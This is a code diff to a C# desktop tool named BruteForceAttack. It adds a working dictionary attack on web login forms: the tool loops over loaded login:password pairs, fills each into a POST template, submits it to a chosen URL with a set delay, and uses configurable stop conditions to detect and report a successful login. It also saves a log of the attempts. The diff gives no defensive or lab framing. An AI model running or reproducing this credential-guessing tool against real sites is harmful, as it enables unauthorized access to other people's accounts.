@@ -172,8 +172,13 @@ namespace BruteForceAttack
             {
                 string filePath = openFileDialog.FileName;
                 credentials.loadCredentialsFormFile(filePath);
-                richTextBoxLog.AppendText(getTime() + ' ' + "-! Dictionary loaded from file !-\n");
-                richTextBoxLog.AppendText(credentials.credentialsListToString()); // load to log container
+
+                if (credentials.ListOfCredentials.Count > 0)
+                {
+                    buttonStart.Enabled = true;
+                    richTextBoxLog.AppendText(getTime() + ' ' + "-! Dictionary loaded from file !-\n");
+                    richTextBoxLog.AppendText(credentials.credentialsListToString()); // load to log container
+                }
             }
         }
 
@@ -189,8 +194,12 @@ namespace BruteForceAttack
             int timeElapsed = 0;
             webBrowser.DocumentCompleted += (s, e) =>
             {
-                if (webBrowser.ReadyState != WebBrowserReadyState.Complete) return;
-                if (pageLoaded.Task.IsCompleted) return; pageLoaded.SetResult(true);
+                if (webBrowser.ReadyState != WebBrowserReadyState.Complete) 
+                    return;
+                if (pageLoaded.Task.IsCompleted) 
+                    return; 
+                
+                pageLoaded.SetResult(true);
             };
          
             while (pageLoaded.Task.Status != TaskStatus.RanToCompletion)
@@ -208,26 +217,34 @@ namespace BruteForceAttack
             string AdditionalHeaders = "Content-Type: application/x-www-form-urlencoded" + Environment.NewLine;
             string documentTextStartPage = webBrowser.DocumentText;
             string startUrl = webBrowser.Url.ToString();
+            bool isSuccess = false;
 
             LinkedList<Credential> encodedCredentials = encodeCredentials();
             
+            //encoding credentials
             if (!encodedCredentials.Equals(credentials.ListOfCredentials))
             {
                 richTextBoxLog.AppendText("\n" + getTime() + " Dictionary after encoding [login:password]" + Environment.NewLine);
-                richTextBoxLog.AppendText(listToString(encodedCredentials));
+                richTextBoxLog.AppendText(listToString(encodedCredentials) + Environment.NewLine);
             }
 
-            foreach (var item in encodedCredentials)
+                richTextBoxLog.AppendText(getTime() + " -! Performing post attack !-\r\n");
+
+            for (int i=0; i< encodedCredentials.Count; i++)
             {
-                string postData = textBoxPostStringSyntax.Text.Replace("$0", item.Login).Replace("$1", item.Password);
-                byte[] postDataByte = Encoding.UTF8.GetBytes(postData);
+                string postData = textBoxPostStringSyntax.Text.Replace("$0", encodedCredentials.ElementAt(i).Login)
+                                                              .Replace("$1", encodedCredentials.ElementAt(i).Password);
                 
-               // Task post = Task.Factory.StartNew(() => webBrowser.Navigate(postUrl, "", postDataByte, AdditionalHeaders));
-               // post.Wait();
+                byte[] postDataByte = Encoding.UTF8.GetBytes(postData);
+
+                webBrowser.Navigate(postUrl, "", postDataByte, AdditionalHeaders);
+                string postLog = "credential [" + credentials.ListOfCredentials.ElementAt(i).Login +
+                                                ':' + credentials.ListOfCredentials.ElementAt(i).Password + "]\r\npost string= \"" + postData + "\"";
+
+                richTextBoxLog.AppendText(getTime() + " For " + postLog + Environment.NewLine);
 
                 try
-                {
-                    webBrowser.Navigate(postUrl, "", postDataByte, AdditionalHeaders);
+                {            
                     await PageLoad(1000, int.Parse(textBoxPostDelay.Text));
                 }
                 catch (Exception exception)
@@ -235,14 +252,47 @@ namespace BruteForceAttack
                     MessageBox.Show(exception.Message);
                 }
 
-                if (isStopCondition(comboBoxStopConditions.SelectedIndex, richTextBoxDocumentText.Text,
+                //execute stop conditions - dictionary attack success
+                if (isStopCondition(comboBoxStopConditions.SelectedIndex, documentTextStartPage,
                                    textBoxRequestedUrl.Text, startUrl, webBrowser))
                 {
-                    MessageBox.Show(postData);
+                    isSuccess = true;
+                    string successLog = "Login success for " + postLog;
+                    richTextBoxLog.AppendText("\r\n" + getTime() + " -! " + successLog + " !-\r\n");
+                    MessageBox.Show(successLog, "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                     break;
                 }
             }
+
+            // dictionary attack fail
+            if (!isSuccess)
+            {
+                string fail = "Dictionary attack failed";
+                richTextBoxLog.AppendText("\r\n" + getTime() + " -! " + fail + " !-\r\n");
+                MessageBox.Show(fail + '.', "Fail!", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+
+            //save log to file
+            DialogResult dialogResult = MessageBox.Show("Do you want to save the log to a file?", 
+                                            "Save log to file", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
+            if (dialogResult == DialogResult.Yes)
+            {
+                saveFileDialog.InitialDirectory = "c:\\";
+                saveFileDialog.Filter = "txt files (*.txt)|*.txt";
+                saveFileDialog.FilterIndex = 1;
+                saveFileDialog.RestoreDirectory = true;
+
+                if (saveFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    string filePath = saveFileDialog.FileName;
+                    richTextBoxLog.SaveFile(filePath, RichTextBoxStreamType.UnicodePlainText);
+                    
+                    richTextBoxLog.AppendText(Environment.NewLine + " -! Log file saved to file: " + filePath + " !-\r\n");
+                }
+            }
         }
+
+        
 
         private LinkedList<Credential> encodeCredentials()
         {
@@ -274,7 +324,7 @@ namespace BruteForceAttack
             StringBuilder builder = new StringBuilder(); 
             foreach (var item in list)
             {
-                builder.AppendLine(item.Login + ':' + item.Password);
+                builder.AppendLine('\t' + item.Login + ':' + item.Password);
             }
             return builder.ToString();
         }
@@ -295,6 +345,12 @@ namespace BruteForceAttack
                     break;
             }
             return isStop;
+        }
+
+        private void richTextBoxLog_TextChanged(object sender, EventArgs e)
+        {
+            richTextBoxLog.SelectionStart = richTextBoxLog.Text.Length;
+            richTextBoxLog.ScrollToCaret();
         }
     }
 }
